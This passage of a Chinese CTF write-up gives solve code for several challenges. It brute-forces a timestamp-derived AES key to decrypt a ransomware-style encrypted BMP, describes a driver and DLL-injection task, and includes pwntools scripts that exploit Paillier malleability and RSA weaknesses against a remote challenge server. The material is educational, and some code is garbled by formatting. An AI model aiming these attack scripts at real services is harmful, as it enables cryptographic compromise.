[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019c8cd9d08b2457b0.png)

第二个函数用 key2 加密了一些数据，调试发现就是 key1

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018029ba7a60f26fd0.png)

后面这两个函数就是调用 key1 加密文件，然后把 加密后的文件 + 加密好的 key1 写到加密好的文件里

[![](https://p1.ssl.qhimg.com/t0107cdd641c2349b92.png)](https://p1.ssl.qhimg.com/t0107cdd641c2349b92.png)

所以关键问题就是恢复 key1。因为有 key2 这一坨东西，调试并在本地复现发现 key2 是 rsa 加密，n巨大无法分解，遂放弃

后来终于注意到题目加密的是 bmp 文件，bmp 文件当然有固定的格式，而 key1 又只有一个时间戳不确定，所以爆破时间戳就行了

爆破时间戳

```
void decrypt_test(void)`{`

      DWORD32 key[4] = `{` 0x0EC62FB2,0x4B54D44F,0,0x8EB1E721 `}`;
      FILE* f;
      int mode;
      fopen_s(&amp;f, "I:\\flag.bmp.ctf_crypter", "rb");
      BYTE* cipher=(BYTE*)malloc(0xd6830);
      memset(cipher, 0, 0xd6830);
      fread(cipher, sizeof(char), 0xd6830, f);

      for (int i = 1629097200; i &lt; 1629553539; i++) `{`
          HCRYPTPROV prov = NULL;
          HCRYPTHASH hash;
          HCRYPTKEY aesKey;
          DWORD length=16;
          key[2] = i;    
          BYTE head[32];
          memset(head, 0, 32);
          memcpy(head, cipher, 16);
          if (!CryptAcquireContextA(&amp;prov, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) `{`
              printf("error0\n");
          `}`
          CryptCreateHash(prov, 0x800Cu, 0, 0, &amp;hash);
          CryptHashData(hash, (const BYTE*)key, 0x10u, 0);
          CryptDeriveKey(prov, 0x660Eu, hash, 0, &amp;aesKey);
          mode = 1;
          CryptSetKeyParam(aesKey, 4u, (const BYTE*)&amp;mode, 0);
          CryptSetKeyParam(aesKey, 3u, (const BYTE*)&amp;mode, 0);
          CryptDecrypt(aesKey, 0, 0, 0, head, &amp;length);
          if (head[0] == 'B' &amp;&amp; head[1] == 'M') `{`
              cout &lt;&lt; i;
              break;
          `}`
      `}`

  `}`
```
- 文件解密
```
void decrypt(void) `{`

DWORD32 key[4] = `{` 0x0EC62FB2,0x4B54D44F,1629098245,0x8EB1E721 `}`;
FILE f;
int mode;
fopen_s(&amp;f, “I:\flag.bmp.ctf_crypter”, “rb”);
BYTE cipher = (BYTE*)malloc(0xd6830);
int totalLength = 0xd6830;
DWORD blockLen = 16;
memset(cipher, 0, totalLength);
fread(cipher, sizeof(char), totalLength, f);
HCRYPTPROV prov = NULL;
HCRYPTHASH hash;
HCRYPTKEY aesKey;
if (!CryptAcquireContextA(&amp;prov, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) `{`

  printf("error0\n");
`}`
CryptCreateHash(prov, 0x800Cu, 0, 0, &amp;hash);
CryptHashData(hash, (const BYTE)key, 0x10u, 0);
CryptDeriveKey(prov, 0x660Eu, hash, 0, &amp;aesKey);
mode = 1;
CryptSetKeyParam(aesKey, 4u, (const BYTE)&amp;mode, 0);
CryptSetKeyParam(aesKey, 3u, (const BYTE*)&amp;mode, 0);
for (int i = 0; i &lt; totalLength; i += 16) `{`

  CryptDecrypt(aesKey, 0, 0, 0, cipher + i, &amp;blockLen);
`}`
FILE* out;
fopen_s(&amp;out, “dec.bmp”, “wb”);
fwrite(cipher, 1, totalLength, out);
printf(“”);

`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ef6d7ef8bb504891.png)

### easy apc

该驱动会释放一个dll作为客户端，然后监听进程创建和dll载入的时间，然后维护一个列表，来实现能够与加载了该dll的进程进行通讯，包括各种通讯机制RPC和DeviceIOControl等

然后该dll还会要求一个DllInjector的dll，然后调用里面的GetContentHash来算test哈希，和结果比较，发现是sha3-256，所以要写两个东西，一个是加载哪个dll的主程序，然后就是DLLInjector，得实现sha3-256，直接抄github上的源码就ok

然后就可以动调加载dll的程序，在LoadLibrary InjectDll.dll的时候下断点，在Dll的入口点断下就能调试了，发现主要的逻辑就是对AkariDll这个字符串算哈希，然后用rpc和驱动通讯算出一个值key，然后和flag一起参与加密，加密是用rand驱动的，6种加密，然后我们只需要分别逆一下这6种加密就ok，非常简单，都是异或等等，然后随便找一组数据把key的结果加密出来，和真正flag的数据组合在一起反过来用rand调用解密函数回退就能得到flag了

### guess

这道题给非预期了（好像），题目里面可以理解为给一个密钥某一位进行加密，并帮助解密一个密文，要求这个密文不能是上面加密的密文。解密后给出一个问题，问上面加密的密钥是奇数位还是偶数位。

首先我们不知道任何密钥，但是根据加密方式

c\equiv g^mw\ mod\ p

exp如下：

```
# -*- coding: utf-8 -*-

from pwn import *
import re
import random
from math import gcd
# from Crypto.Util.number import inverse
from hashlib import sha256


String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz"

def proof(known, hashcode):
    for each1 in String:
        for each2 in String:
            for each3 in String:
                for each4 in String:
                    this = each1 + each2 + each3 + each4 + known
                    if sha256(this.encode()).hexdigest() == hashcode:
                        # print(each1 + each2 + each3 + each4)
                        return each1 + each2 + each3 + each4


def exgcd(a, b):
    if b == 0:
        return 1, 0, a
    else:
        x, y, q = exgcd(b, a % b)
        x, y = y, (x - (a // b) * y)
        return x, y, q


def invert(a,p):
    x, y, q = exgcd(a,p)
    if q != 1:
        raise Exception("No solution.")
    else:
        return (x + p) % p


def enc(n, g, m):
    while 1:
        r = random.randint(2, n - 1)
        if gcd(r, n) == 1:
            break
    c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2)
    return c


def dec(n, g, LAMBDA, c):
    L1 = (pow(c, LAMBDA, n ** 2) - 1) // n
    L2 = (pow(g, LAMBDA, n ** 2) - 1) // n
    m = (invert(L2, n) * L1) % n
    return m

host, port = "47.104.85.225", 57811

keys = `{`521, 526, 530, 542, 548, 550, 558, 566, 577, 585, 611, 613, 614, 113, 114, 119, 121, 123, 637, 638, 639, 128, 129, 130, 641, 646, 647, 653, 142, 148, 158, 685, 184, 186, 201, 718, 727, 216, 232, 745, 746, 237, 751, 241, 244, 780, 783, 271, 281, 286, 288, 810, 299, 307, 309, 313, 333, 860, 349, 355, 877, 885, 888, 899, 903, 396, 400, 918, 416, 936, 939, 427, 942, 430, 944, 461, 977, 983, 995, 498`}`

index = `{`530: b'0', 521: b'0', 585: b'0', 899: b'0', 281: b'1', 355: b'0', 128: b'1', 416: b'0', 498: b'0', 944: b'1', 977: b'1', 396: b'1', 550: b'0', 877: b'1', 918: b'1', 333: b'1', 244: b'1', 647: b'1', 611: b'0', 461: b'1', 637: b'0', 614: b'0', 216: b'1', 639: b'0', 727: b'1', 119: b'0', 983: b'0', 237: b'1', 148: b'0', 810: b'1', 130: b'0', 685: b'0', 885: b'0', 114: b'0', 427: b'0', 201: b'1', 860: b'1', 888: b'1', 783: b'0', 646: b'1', 299: b'0', 288: b'0', 653: b'1', 129: b'1', 313: b'0', 558: b'0', 309: b'1', 142: b'0', 745: b'1', 613: b'1', 936: b'1', 548: b'1', 903: b'0', 718: b'0', 158: b'1', 542: b'1', 566: b'0', 400: b'1', 186: b'1', 780: b'1', 577: b'0', 638: b'0', 430: b'1', 641: b'1', 751: b'0', 286: b'1', 995: b'0', 113: b'1', 939: b'0', 746: b'0'`}`

context.log_level = 'debug'


while True:
    try:
        sh = remote(host, port)
        data = sh.recvrepeat(1).decode()
        known, hashcode = re.findall(r'256\(\?\+(.*?)\) == (.*?)\n', data)[0]
        secret = proof(known, hashcode)
        sh.sendline(secret.encode())

        for _ in range(32):
            data = sh.recvrepeat(2).decode()
            n = int(re.findall(r'n = (.*?)\n', data)[0])
            g = int(re.findall(r'g = (.*?)\n', data)[0])

            sh.sendline(b'123')
            sh.recv()

            sh.sendline(b'3')
            sh.recv()
            sh.sendline(b'3')
            data = sh.recvrepeat(1).decode()

            c = int(re.findall(r'This is a ciphertext.\n(.*?)\n', data)[0])
            c2 = c * g % (n ** 2)

            sh.sendline(str(c2).encode())
            data = sh.recvrepeat(1).decode()

            res = int(re.findall(r'This is the corresponding plaintext.\n(.*?)\n', data)[0])
            assert (res - 1) % 9 == 0
            this = (res - 1) // 9


            if this not in index:
                sh.sendline(b'0')
                data = sh.recv().decode()
                if "Sorry" in data:
                    index[this] = b'1'
                    break
                else:
                    index[this] = b'0'
            else:
                sh.sendline(index[this])
                sh.recv()
            print(index)

        else:
            print(sh.recvrepeat(1).decode())
            sh.close()
            break

        sh.close()
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except:
        pass
```

### <a class="reference-link" name="Random_RSA"></a>Random_RSA

在py2中拿到$dp$

```
seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]
res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]


import random

dp = ''

for i, each in enumerate(seeds):
    random.seed(each)
    for _ in range(i % 4):
        random.randint(0,255)
    dp += chr(res[i] ^ random.randint(0,255))

print(dp)
```

e <em> dp \equiv 1\ (mod\ p-1)\<br>
e </em> dp = k(p – 1) +1\<br>
e * dp + k – 1 = pk

爆破$k$，求$gcd(n, e * dp + k – 1)$解出$p$

```
from Crypto.Util.number import *


n = 81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391
c = 61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151
e = 65537
dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057

for i in range(e):
    if GCD(n, int(e * dp + i - 1)) &gt; 1:
        p = GCD(n, int(e * dp + i - 1))
        q = n // p
        print(long_to_bytes(pow(c, inverse(e, (p - 1) * (q - 1)), n)))
        break
```

### <a class="reference-link" name="myRSA"></a>myRSA

先对$n-1$进行加密，拿到$temp = (x + y)(n-1)+k_1+k_2$<br>
$k_1+k_2$大概有1041bit讲temp整除$n-1$之后可以得到$x+y$的大概值<br>
然后根据大小关系，直接对$x+y$开三次根 $+1$拿到$p+q$，拿flag同理直接把 enc_flag 整除$x+y$即可拿到正常的c

```
# -*- coding: utf-8 -*-

from hashlib import sha256
from Crypto.Util.number import *
from pwn import *
from gmpy2 import iroot


String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz'


def proof(known, hashcode):
    for each1 in String:
        for each2 in String:
            for each3 in String:
                for each4 in String:
                    this = each1 + each2 + each3 + each4 + known
                    if sha256(this.encode()).hexdigest() == hashcode:
                        # print(each1 + each2 + each3 + each4)
                        return each1 + each2 + each3 + each4


host, port = "47.104.85.225", 49803
context.log_level = "debug"

sh = remote(host, port)

data = sh.recvrepeat(1).decode()
known, hashcode = re.findall(r'256\(\?\+(.*?)\) == (.*?)\n', data)[0]

secret = proof(known, hashcode)

sh.sendline(secret.encode())


sh.recvuntil('This is my public key:\n')

n = int(sh.recvuntil('\n').decode().strip().split(' ')[-1])
e = 0x10001
sh.recvuntil('exit\n')

sh.sendline(b'1')
sh.recvuntil('\n')

sh.sendline(long_to_bytes(n - 1))
sh.recvuntil('\n')
tmp = int(sh.recvuntil('\n').decode().strip())


sh.recvuntil('exit\n')
sh.sendline(b'2')
sh.recvuntil('\n')
sh.recvuntil('\n')
c = int(sh.recvuntil('\n').decode().strip())

sum = (iroot(tmp // (n - 1), 3)[0] + 1)

p = (sum - iroot(sum ** 2 - 4 * n, 2)[0]) // 2
q = n // p

c = c // ((p + q) ** 3 - (p - q) ** 2 + (p + q))
print(long_to_bytes(pow(c, inverse(e, (p - 1) * (q - 1)), n)))
```
